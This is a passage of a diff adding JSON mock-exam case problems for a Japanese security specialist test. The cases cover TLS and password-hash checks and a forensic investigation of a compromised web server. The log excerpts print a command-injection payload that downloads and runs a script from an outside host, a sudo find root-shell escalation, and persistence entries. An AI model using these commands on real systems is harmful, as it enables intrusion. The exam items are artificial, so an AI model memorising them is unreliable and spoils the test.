+            ],
+            [
+              "C3",
+              "CA-β",
+              "pay.x-shop.example",
+              "2026-10-20 09:15"
+            ],
+            [
+              "C4",
+              "CA-α",
+              "*.x-shop.example",
+              "2026-10-25 16:40"
+            ],
+            [
+              "C5",
+              "CA-β",
+              "www.x-shop.example",
+              "2026-09-20 11:05"
+            ],
+            [
+              "C6",
+              "CA-α",
+              "x-shop.example，pay.x-shop.example",
+              "2026-11-02 13:22"
+            ]
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "〔TLS設定の点検〕"
+        },
+        {
+          "type": "paragraph",
+          "text": "www.x-shop.exampleのWebサーバのTLS設定を図1に，このWebサーバに接続するクライアントを表3に示す。表3の暗号スイートは，各クライアントがClientHelloで提示する順序で記載している。"
+        },
+        {
+          "type": "code",
+          "id": "図1",
+          "caption": "WebサーバのTLS設定（nginx，抜粋）",
+          "language": "nginx",
+          "content": "server {\n    listen 443 ssl;\n    server_name www.x-shop.example;\n    ssl_certificate     /etc/nginx/tls/www.crt;   # RSA 2048ビットの鍵の証明書だけを設定\n    ssl_certificate_key /etc/nginx/tls/www.key;\n    ssl_protocols TLSv1.2 TLSv1.3;\n    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA';\n    ssl_prefer_server_ciphers on;\n    ssl_ecdh_curve X25519:prime256v1;\n}",
+          "notes": [
+            "注記 暗号スイート名はOpenSSLの表記である。ssl_ciphersはTLS 1.2以前の暗号スイートだけに適用され，TLS 1.3の暗号スイートは既定値（全てECDHE又はDHEによる鍵交換）が用いられる。"
+          ]
+        },
+        {
+          "type": "table",
+          "id": "表3",
+          "caption": "Webサーバに接続するクライアント",
+          "columns": [
+            "記号",
+            "クライアント",
+            "対応するTLSのバージョン",
+            "提示する暗号スイート（TLS 1.2）"
+          ],
+          "rows": [
+            [
+              "K1",
+              "一般の会員が利用するWebブラウザ",
+              "TLS 1.3，TLS 1.2",
+              "ECDHE-ECDSA-AES128-GCM-SHA256，ECDHE-RSA-AES128-GCM-SHA256，ECDHE-RSA-AES256-GCM-SHA384"
+            ],
+            [
+              "K2",
+              "物流センターの業務端末",
+              "TLS 1.2",
+              "AES256-SHA，ECDHE-RSA-AES256-GCM-SHA384，AES128-GCM-SHA256"
+            ],
+            [
+              "K3",
+              "店舗のPOS端末",
+              "TLS 1.2",
+              "AES128-GCM-SHA256，AES256-SHA，ECDHE-ECDSA-AES128-GCM-SHA256"
+            ],
+            [
+              "K4",
+              "旧型のハンディターミナル",
+              "TLS 1.2",
+              "AES256-SHA"
+            ],
+            [
+              "K5",
+              "外部の死活監視サービス",
+              "TLS 1.2",
+              "ECDHE-RSA-AES128-GCM-SHA256，AES128-GCM-SHA256"
+            ]
+          ],
+          "notes": [
+            "注記 ECDHEに対応するクライアントは，いずれもX25519及びprime256v1に対応している。"
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "〔パスワード保管方式の点検〕"
+        },
+        {
+          "type": "paragraph",
+          "text": "X社の会員のパスワードは，表4のグループごとに異なる方式で保管している。各会員のソルトは会員ごとに異なる16バイトの乱数である。"
+        },
+        {
+          "type": "table",
+          "id": "表4",
+          "caption": "会員のグループとパスワードの保管方式",
+          "columns": [
+            "グループ",
+            "対象",
+            "保管方式",
+            "パスワードの条件（登録時）"
+          ],
+          "rows": [
+            [
+              "G1",
+              "2019年以前に登録し，方式の移行が済んでいない会員",
+              "SHA-256（ソルト‖パスワード）を1回計算",
+              "8文字，英大文字・英小文字・数字（62種）"
+            ],
+            [
+              "G2",
+              "方式の移行が済んだ会員",
+              "PBKDF2-HMAC-SHA256（反復回数600,000回）",
+              "8文字，英大文字・英小文字・数字（62種）"
+            ],
+            [
+              "G3",
+              "法人会員（移行が済んでいない）",
+              "SHA-256（ソルト‖パスワード）を1回計算",
+              "12文字，英大文字・英小文字・数字（62種）"
+            ],
+            [
+              "G4",
+              "旧スマートフォンアプリから登録した会員",
+              "PBKDF2-HMAC-SHA256（反復回数600,000回）",
+              "6文字，英大文字・英小文字・数字（62種）"
+            ],
+            [
+              "G5",
+              "2025年以降に登録した会員",
+              "bcrypt（コスト12）",
+              "8文字，英小文字・数字（36種）"
+            ]
+          ],
+          "notes": [
+            "注記 本表では，各グループのパスワードは，表中の文字数ちょうどで，表中の文字種から構成されるものとして評価する。"
+          ]
+        },
+        {
+          "type": "paragraph",
+          "text": "Nさんは，パスワードのハッシュ値が漏えいした場合を想定し，攻撃者の計算能力を表5のとおり見積もった。X社の規程では，“1会員当たりのパスワードの全数探索に要する時間（最悪時）が1年（3.15×10^7秒）以下となるグループは，パスワードの強制再設定の対象とする”と定めている。"
+        },
+        {
+          "type": "table",
+          "id": "表5",
+          "caption": "想定する攻撃者の計算能力",
+          "columns": [
+            "保管方式",
+            "1秒当たりの試行回数"
+          ],
+          "rows": [
+            [
+              "SHA-256（ソルト‖パスワード）を1回計算",
+              "1.0×10^11"
+            ],
+            [
+              "PBKDF2-HMAC-SHA256（反復回数600,000回）",
+              "8.0×10^4"
+            ],
+            [
+              "bcrypt（コスト12）",
+              "2.0×10^4"
+            ]
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "sc-b-mock01-c12",
+      "caseType": "multi",
+      "problemNo": 12,
+      "title": "公開Webサーバの侵害に関するログ・ファイル調査と検知ルールの評価",
+      "domains": [
+        "セキュリティ監視",
+        "デジタルフォレンジック",
+        "インシデント対応"
+      ],
+      "body": [
+        {
+          "type": "paragraph",
+          "text": "Y社は，従業員250名の旅行会社である。Y社は，予約サイトの公開WebサーバとしてLinuxサーバweb01を運用しており，各サーバのログをSIEMに集約している。2026年11月14日（土），SIEMがアラートを発報したことから，Y社のCSIRTのMさん（登録セキスペ）がweb01の調査を行った。"
+        },
+        {
+          "type": "table",
+          "id": "表1",
+          "caption": "web01及び監視環境の情報（抜粋）",
+          "columns": [
+            "項目",
+            "内容"
+          ],
+          "rows": [
+            [
+              "OS・時刻設定",
+              "Ubuntu 24.04。タイムゾーンはUTC（Etc/UTC）。NTPで時刻同期しており，時刻のずれはない"
+            ],
+            [
+              "Webサーバ",
+              "nginx。アクセスログは$time_local（サーバのタイムゾーンの時刻）で記録する。/cgi-bin/statusは，指定したホストへのpingの結果を表示する運用監視用のCGIで，www-data権限で動作する"
+            ],
+            [
+              "SSH",
+              "インターネットに公開。パスワード認証と公開鍵認証を許可。PermitRootLogin no"
+            ],
+            [
+              "監査",
+              "auditdでexecveシステムコールを記録している"
+            ],
+            [
+              "SIEM",
+              "画面及びアラートの時刻は日本時間（JST，UTC+9）で表示する"
+            ]
+          ]
+        },
+        {
+          "type": "table",
+          "id": "表2",
+          "caption": "SIEMのアラート",
+          "columns": [
+            "発報日時（JST）",
+            "内容"
+          ],
+          "rows": [
+            [
+              "2026-11-14 02:21:07",
+              "web01：外部IPアドレス198.51.100.23からのSSHログインの直後に，rootのシェルが起動された"
+            ]
+          ]
+        },
+        {
+          "type": "code",
+          "id": "図1",
+          "caption": "web01のnginxアクセスログ（抜粋）",
+          "language": "text",
+          "content": "192.0.2.44 - - [13/Nov/2026:17:01:30 +0000] \"GET / HTTP/1.1\" 200 5120 \"-\" \"Mozilla/5.0\"\n203.0.113.77 - - [13/Nov/2026:17:02:11 +0000] \"GET /cgi-bin/status?host=127.0.0.1 HTTP/1.1\" 200 412 \"-\" \"curl/8.5.0\"\n203.0.113.77 - - [13/Nov/2026:17:03:40 +0000] \"GET /cgi-bin/status?host=127.0.0.1%3Bid HTTP/1.1\" 200 468 \"-\" \"curl/8.5.0\"\n203.0.113.77 - - [13/Nov/2026:17:04:12 +0000] \"GET /cgi-bin/status?host=127.0.0.1%3Bcurl%20-s%20http%3A%2F%2F198.51.100.23%2Fx.sh%20-o%20%2Ftmp%2Fx.sh%3Bsh%20%2Ftmp%2Fx.sh HTTP/1.1\" 200 455 \"-\" \"curl/8.5.0\"\n192.0.2.44 - - [13/Nov/2026:17:05:02 +0000] \"GET /products?id=1042 HTTP/1.1\" 200 8834 \"-\" \"Mozilla/5.0\"\n203.0.113.77 - - [13/Nov/2026:17:06:05 +0000] \"GET /cgi-bin/stats?host=127.0.0.1%60id%60 HTTP/1.1\" 404 162 \"-\" \"curl/8.5.0\"\n203.0.113.77 - - [13/Nov/2026:17:08:41 +0000] \"GET /cgi-bin/status?host=%24%28whoami%29 HTTP/1.1\" 200 430 \"-\" \"curl/8.5.0\"\n203.0.113.77 - - [13/Nov/2026:17:09:05 +0000] \"GET /cgi-bin/status?host=127.0.0.1%3Buname%20-a HTTP/1.1\" 200 501 \"-\" \"curl/8.5.0\""
+        },
+        {
+          "type": "code",
+          "id": "図2",
+          "caption": "web01の/var/log/auth.log（抜粋）",
+          "language": "text",
+          "content": "Nov 13 16:10:02 web01 sshd[1803]: Failed password for root from 192.0.2.201 port 40112 ssh2\n（16:10:02〜16:48:55に，192.0.2.201からのFailed passwordが計1,912件。Accepted passwordは0件）\nNov 13 16:48:55 web01 sshd[1998]: Failed password for invalid user admin from 192.0.2.201 port 52290 ssh2\nNov 13 17:20:45 web01 sshd[2210]: Accepted publickey for deploy from 198.51.100.23 port 51123 ssh2: ED25519 SHA256:Hq7vT2…k2\nNov 13 17:20:58 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash"
+        },
+        {
+          "type": "code",
+          "id": "図3",
+          "caption": "web01のauditdのexecve記録（要約。時刻はUTC）",
+          "language": "text",
+          "content": "2026-11-13 17:04:13 uid=www-data(33) exe=/usr/bin/curl  argv=\"curl -s http://198.51.100.23/x.sh -o /tmp/x.sh\"\n2026-11-13 17:04:13 uid=www-data(33) exe=/usr/bin/dash  argv=\"sh /tmp/x.sh\"\n2026-11-13 17:12:50 uid=www-data(33) exe=/usr/bin/sudo  argv=\"sudo /usr/bin/find /tmp -name x.sh -exec /bin/sh -p ;\"\n2026-11-13 17:12:50 uid=www-data(33) euid=root(0) exe=/usr/bin/dash argv=\"/bin/sh -p\""
+        },
+        {
+          "type": "paragraph",
+          "text": "Mさんは，web01のファイルシステムを保全した上で，変更時刻を基にファイルを調査した。調査したファイルを表3に示す。表3の時刻はUTCである。"
+        },
+        {
+          "type": "table",
+          "id": "表3",
+          "caption": "調査したファイル",
+          "columns": [
+            "記号",
+            "パス",
+            "mtime",
+            "ctime",
+            "所有者",
+            "内容・調査結果"
+          ],
+          "rows": [
+            [
+              "①",
+              "/etc/cron.d/sysupdate",
+              "2026-11-13 17:14:10",
+              "2026-11-13 17:14:10",
+              "root",
+              "*/10 * * * * root /usr/local/lib/.sysupd/updater >/dev/null 2>&1"
+            ],
+            [
+              "②",
+              "/home/deploy/.ssh/authorized_keys",
+              "2026-11-13 17:13:02",
+              "2026-11-13 17:13:02",
+              "deploy",
+              "公開鍵2行。1行目：ssh-ed25519 …（SHA256:Pc4mR8…9x）deploy@ci-runner。2行目：ssh-ed25519 …（SHA256:Hq7vT2…k2）backup@nas01。構成管理台帳に登録されている鍵は1行目だけである"
+            ],
+            [
+              "③",
+              "/tmp/x.sh",
+              "2026-11-13 17:04:13",
+              "2026-11-13 17:04:13",
+              "www-data",
+              "198.51.100.23から/usr/local/lib/.sysupd/updaterの元となるファイルを/tmpにダウンロードする処理だけを含む"
+            ],
+            [
+              "④",
+              "/lib/systemd/system/dbus-helper.service",
+              "2024-02-10 03:11:00",
+              "2026-11-13 17:15:40",
+              "root",
+              "[Service] ExecStart=/usr/local/lib/.sysupd/updater，Restart=always。[Install] WantedBy=multi-user.target。dpkg -Sで照会した結果，このファイルを含むパッケージはない。/etc/systemd/system/multi-user.target.wants/dbus-helper.serviceへのシンボリックリンク（ctime 2026-11-13 17:15:41）がある"
+            ],
+            [
+              "⑤",
+              "/etc/sudoers.d/webops",
+              "2025-06-02 10:21:33",
+              "2025-06-02 10:21:33",
+              "root",
+              "www-data ALL=(root) NOPASSWD: /usr/bin/find"
+            ],
+            [
+              "⑥",
+              "/etc/systemd/system/nginx.service.d/override.conf",
+              "2026-03-18 15:40:12",
+              "2026-03-18 15:40:12",
+              "root",
+              "[Service] LimitNOFILE=65535。2026年3月18日の変更管理記録がある"
+            ],
+            [
+              "—",
+              "/usr/local/lib/.sysupd/updater",
+              "2026-11-13 17:14:05",
+              "2026-11-13 17:14:05",
+              "root",
+              "外部のサーバに定期的に接続するELF形式の実行ファイル"
+            ]
+          ],
+          "notes": [
+            "注記 mtimeはファイル内容の最終変更時刻，ctimeはinode情報（内容，所有者，権限，タイムスタンプなど）の最終変更時刻である。web01のファイルシステムでは，利用者はtouchコマンドなどでmtimeを任意の値に設定できるが，ctimeはそのような操作をした時点の時刻に更新される。"
+          ]
+        },
+        {
+          "type": "heading",
+          "text": "〔検知ルールの評価〕"
+        },
+        {
+          "type": "paragraph",
+          "text": "Mさんは，同種の攻撃を早期に検知するため，SIEMに図4の検知ルールを追加することを検討し，図1のアクセスログに適用した場合の動作を確認した。"
+        },
+        {
+          "type": "code",
+          "id": "図4",
+          "caption": "検討中の検知ルール",
+          "language": "text",
+          "content": "対象：nginxアクセスログ\n条件A：ステータスコードが200である\n条件B：リクエストのクエリ文字列をURLデコードした結果に，“;”，“|”，“`”，“$(”のいずれかを含む\n発報：同一送信元IPアドレスからの，条件A及び条件Bを共に満たすリクエストが，\n      最初と最後の記録時刻の差が300秒以下の範囲に3件以上記録された時点で発報する。\n      発報時刻は，その3件目のリクエストの記録時刻とする。",
+          "notes": [
+            "注記 SIEMはログをリアルタイムに評価し，ログ中の記録時刻を基に判定する。"
+          ]
+        }
+      ]
+    }
+  ]
+}
